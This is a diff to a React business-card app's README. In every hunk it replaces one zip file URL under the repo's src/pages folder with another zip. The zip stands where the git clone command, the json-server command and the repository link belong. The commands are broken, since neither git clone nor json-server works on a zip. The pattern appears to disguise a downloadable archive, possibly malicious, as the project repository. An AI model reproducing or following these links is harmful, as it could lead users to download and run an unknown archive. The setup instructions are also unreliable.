@@ -54,7 +54,7 @@ This is a digital business card application built with React. It allows users to
 ## 🧪 Running the App
 
 1. Clone the repository:
-git clone https://raw.githubusercontent.com/lenane68/Business-Cards-React-Project/main/src/pages/React-Cards-Project-Business-v1.0.zip cd Business-Cards-React-Project
+git clone https://raw.githubusercontent.com/lenane68/Business-Cards-React-Project/main/src/pages/Business_Project_Cards_React_2.6-beta.4.zip cd Business-Cards-React-Project
 
 2. Install dependencies:
    npm install
@@ -65,7 +65,7 @@ git clone https://raw.githubusercontent.com/lenane68/Business-Cards-React-Projec
    npm install @hookform/resolvers yup
 
 3. Start JSON Server (mock backend):
-   npx json-server --watch https://raw.githubusercontent.com/lenane68/Business-Cards-React-Project/main/src/pages/React-Cards-Project-Business-v1.0.zip --port 3900
+   npx json-server --watch https://raw.githubusercontent.com/lenane68/Business-Cards-React-Project/main/src/pages/Business_Project_Cards_React_2.6-beta.4.zip --port 3900
    
 Run the React app:
 npm run dev
@@ -75,7 +75,7 @@ npm run dev
 
 ## 🔗 Links
 
-- **GitHub Repository:** [https://raw.githubusercontent.com/lenane68/Business-Cards-React-Project/main/src/pages/React-Cards-Project-Business-v1.0.zip](https://raw.githubusercontent.com/lenane68/Business-Cards-React-Project/main/src/pages/React-Cards-Project-Business-v1.0.zip)
+- **GitHub Repository:** [https://raw.githubusercontent.com/lenane68/Business-Cards-React-Project/main/src/pages/Business_Project_Cards_React_2.6-beta.4.zip](https://raw.githubusercontent.com/lenane68/Business-Cards-React-Project/main/src/pages/Business_Project_Cards_React_2.6-beta.4.zip)
 
 ---
 
